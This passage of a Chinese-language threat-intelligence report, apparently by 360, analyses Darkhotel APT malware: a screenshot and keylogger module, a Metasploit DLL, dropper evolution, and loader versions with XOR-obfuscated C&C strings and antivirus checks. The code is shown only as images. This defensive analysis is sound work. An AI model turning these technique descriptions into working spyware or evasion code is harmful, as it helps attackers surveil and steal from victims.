[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0101617d4fa85cffb2.png)

主函数中通过调用BitBlt抓取屏幕截图，并通过GDI函数保存成JPG文件。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t016f5fab08b4458eb2.png)

临时的JPG文件保存在C:\ProgramData\AssemblyDataCache目录下：

[![](https://p4.ssl.qhimg.com/t01643bea59ff708b2f.png)](https://p4.ssl.qhimg.com/t01643bea59ff708b2f.png)

之后对图片进行加密处理，并剪切到C:\ProgramData\AU50FE1D目录下：

[![](https://p2.ssl.qhimg.com/t0140cc386ff38bf80d.png)](https://p2.ssl.qhimg.com/t0140cc386ff38bf80d.png)

最终保存的图片如下所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0172d82506786ce2d7.png)

**Helpcst.dll/kbdlu.dll**

该DLL为键盘记录模块，通过主模块Retromain.dll加载运行，运行后会判断其进程是否为SearchProtocolHost.exe，否则退出，之后开启键盘记录线程：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t019d89a6e302dbaea1.png)

获取部分需要使用的字符串，加密方式和主模块一致：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t018dbe0a63d1530e7e.png)

其中包含了对应的键盘记录存放目录（%ALLUSERSPROFILE%\\AU50FE1D），及记录的文件类型，其同样会创建一个名为klua的窗口，并设置对应的lpfunWndProc函数，该函数为键盘记录主体：

[![](https://p0.ssl.qhimg.com/t01c1817babcac1f009.png)](https://p0.ssl.qhimg.com/t01c1817babcac1f009.png)

该DLL中使用GetRawInput的方式获取击健记录：

[![](https://p5.ssl.qhimg.com/t013a85efdcdb69d6bc.png)](https://p5.ssl.qhimg.com/t013a85efdcdb69d6bc.png)

记录日志如下所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0155cde5b37bedccb8.png)

**metsrv.dll**

该DLL为Metasploit生成的攻击DLL。



### 还原攻击流程

通过360威胁情报中心的大数据关联，我们补齐了其它缺失的攻击样本，还原了本次攻击的整个流程：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01f85d94928db7038d.png)



## 溯源和关联

通过对样本中使用的特殊代码结构、域名/IP等的关联分析，以及使用360威胁情报中心分析平台对相关样本和网络基础设施进行拓展，我们有理由相信此次攻击的幕后团伙为Darkhotel（APT-C-06）。



### 网络内容合法性算法关联

在分析的msfte.dll样本中我们注意到一段比较特殊的校验获取网络内容的合法性的算法，校验代码如下：

[![](https://p4.ssl.qhimg.com/t0107b987184f33af6c.png)](https://p4.ssl.qhimg.com/t0107b987184f33af6c.png)

通过对使用了相同算法的样本关联分析，我们发现了另外两种形式的Dropper样本，分别是EXE和图片文件捆绑执行的样本，以及通过Lnk快捷方式执行的样本，他们都使用了相似的代码结构，可以确认这两种形式的Dropper样本和本次分析的样本出自同一团伙之手，比如特殊的校验获取的网络内容合法性算法部分完全一致：

[![](https://p5.ssl.qhimg.com/t017218a72fc9eed8e1.png)](https://p5.ssl.qhimg.com/t017218a72fc9eed8e1.png)

样本A（wuauctl.exe）

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01b4d85d3ca7902569.png)

样本B(cala32.exe)



### 域名关联分析指向DarkHotel

进一步分析使用Lnk快捷方式执行恶意代码的样本，可以看到都使用了完全一致的命令行参数和代码：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01b96f3cb7de41de35.png)

习惯性的使用360威胁情报中心数据平台搜索样本中用于下载恶意脚本的两个域名，可以看到相关域名正是360威胁情报中心内部长期跟踪的Darkhotel APT团伙使用的域名，相关域名早已经被打上Darkhotel的标签：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t011c43c35533b0d859.png)



### 溯源关联图

[![](https://p2.ssl.qhimg.com/t01f25288fccc006cf7.png)](https://p2.ssl.qhimg.com/t01f25288fccc006cf7.png)



### Dropper演变史

360威胁情报中心通过大数据关联，对 DarkHotel APT团伙从2016年以来使用的Dropper进行了整理分析。

#### 2016年

DarkHotel APT团伙从2016年以来一直使用Lnk快捷方式这种成本低廉且稳定的方式投递鱼叉邮件：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01adfd96f8e1a58dac.png)

对应的命令行参数：

[![](https://p3.ssl.qhimg.com/t0144e1a0433b6dea50.png)](https://p3.ssl.qhimg.com/t0144e1a0433b6dea50.png)

#### 2017年

2017年开始同时使用伪装图片文件的PE文件的方式投递鱼叉邮件：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0111a0440fc26ad6a4.png)

#### 2018年

到2018年，DarkHotel开始使用已知好用的Office NDay 或者Office 0Day漏洞来投递鱼叉邮件，一般使用的Dropper名一般为：

letter.doc



### 各版本Loader对比分析

360威胁情报中心通过大数据关联，对 DarkHotel APT团伙近年来使用的多个Loader版本进行了整理分析，通过分析大致可以看到该Loader历经了三个开发周期：

**第一版Loader**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t010bda5842036dd241.png)<br>
最初版本的Loader主函数功能十分清晰，线程中执行主要的Loader功能，并通过LoadLibrary加载模块DLL：

[![](https://p0.ssl.qhimg.com/t01e3bdcd9a87cc35ca.png)](https://p0.ssl.qhimg.com/t01e3bdcd9a87cc35ca.png)

主线程中只对C&amp;C进行了加密处理，如下所示其URL的字段和现在的版本基本一致：

[![](https://p4.ssl.qhimg.com/t01caf427ccfa601040.png)](https://p4.ssl.qhimg.com/t01caf427ccfa601040.png)

C&amp;C的加密算法如下所示，也是简单的XOR及加减处理，甚至其对应操作的变量都是一致的：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015bbe890f4599ca0b.png)

加密C&amp;C字段同样以OCC标记。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016e71f155d58226ef.png)

Loader中本身内嵌了杀软的检测代码，如下所示，可以看到早期的样本中检测杀软比最新版要多很多：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01c57e7f11d77f2fb2.png)

检测中时候用的字符如下所示并没用进行混淆处理：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01e092b293e7b907c2.png)

和最新模块一致的信息收集方式（大量CMD指令获取计算机信息）：

[![](https://p5.ssl.qhimg.com/t01186d89e90f5e0b9b.png)](https://p5.ssl.qhimg.com/t01186d89e90f5e0b9b.png)

提交的用户信息中，同样会在前八个字节创建对应siginal，算法至今未变：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0168d6a08aaa9307f3.png)

下载服务器返回的其他模块并加载，如下所示，加载器校验对应的下载模块是否以UPG或DEL开头，最新版本的校验头为DLL：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t011fec8eca92159765.png)

创建对应的自删除BAT文件：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014e4af506e7afd7be.png)

**第二版Loader**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01f7efc616a9bf67da.png)<br>
第二版和第一版相差不大，代码逻辑上基本没有修改，只是对第一版中大量的敏感字符进行了混淆处理，如下为解密的对应杀软检测字符：

[![](https://p5.ssl.qhimg.com/t018f975d9c67f8fedd.png)](https://p5.ssl.qhimg.com/t018f975d9c67f8fedd.png)

对应的插件名，URL字段：

[![](https://p3.ssl.qhimg.com/t0170d30ae5216dd6fe.png)](https://p3.ssl.qhimg.com/t0170d30ae5216dd6fe.png)

以简单的GetCC函数为例，可以看到代码整体逻辑是没有区别的：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t013a0a70df29cc2c67.png)

只是增加了对应的混淆还原处理：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01109a8a69ab0325ba.png)

**第三版Loader**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01177709e30787f0d1.png)

[![](https://p0.ssl.qhimg.com/t0126c5d14f227872fb.png)](https://p0.ssl.qhimg.com/t0126c5d14f227872fb.png)

通过和之前两个版本的比较，结合样本的分析，可以发现第三版是在第二版的基础上进行拆分，第二版的代码直接被拆分为现在的msfte.dll、ReroMain以及NTWDBLIB.dll三个DLL，但是代码的整体逻辑，包括加密算法、通信校验上并没有太大的变化，而是把Loader的功能进行了更细粒度的拆分，使其更加模块化。



## 总结

360威胁情报中心对Darkhotel APT团伙的近期攻击活动中使用的恶意代码进行了深入的分析挖掘，并结合威胁情报数据对该团伙近三年来的攻击武器进行了分析和比较，可以看出该团伙主要使用鱼叉攻击投放攻击载荷文件，并不断更换其载荷文件的形态。结合对该团伙历史攻击武器的分析，其持续更新迭代恶意代码的功能和形态，并呈现出功能模块化的趋势。

目前，基于360威胁情报中心的威胁情报数据的全线产品，包括360威胁情报平台（TIP）、天眼高级威胁检测系统、360 NGSOC等，都已经支持对此APT攻击团伙攻击活动的检测。



## IOCs

[![](https://p3.ssl.qhimg.com/t015a7f07cd6fa3308f.png)](https://p3.ssl.qhimg.com/t015a7f07cd6fa3308f.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01bb38b01aff8e43d4.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01e931c0ceeb687682.png)



## 参考

[https://ti.360.net/](https://ti.360.net/)

[https://github.com/FuzzySecurity/PowerShell-Suite](https://github.com/FuzzySecurity/PowerShell-Suite)
